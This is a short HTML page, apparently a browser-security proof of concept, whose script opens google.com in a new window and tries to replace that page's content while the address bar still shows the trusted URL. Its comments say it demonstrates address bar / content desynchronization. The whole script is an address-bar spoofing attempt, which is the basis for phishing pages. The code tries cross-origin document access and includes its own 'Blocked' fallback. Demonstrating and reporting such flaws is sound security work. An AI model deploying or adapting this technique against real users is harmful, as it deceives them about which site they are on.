<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>UI State Test</title>
</head>
<body>
<h2>Opening trusted page…</h2>

<script>
(function () {
    // 1. Open a trusted site in a new window
    const w = window.open("https://google.com/csi");

    // 2. After navigation lifecycle settles
    setTimeout(() => {
        try {
            // 3. Hook into navigation restore / BFCache
            w.addEventListener("pageshow", function () {
                // 4. Replace visible content (no phishing)
                w.document.documentElement.innerHTML = `
                  <body style="font-family:sans-serif">
                    <h1>UI Trust Indicator Test</h1>
                    <p>
                      The address bar still shows:
                      <b>${w.location.href}</b>
                    </p>
                    <p>
                      But this content was injected after navigation lifecycle.
                    </p>
                    <p style="color:red">
                      This demonstrates address bar / content desynchronization.
                    </p>
                  </body>
                `;
            });
        } catch (e) {
            console.log("Blocked:", e);
        }
    }, 2000);
})();
</script>
</body>
</html>
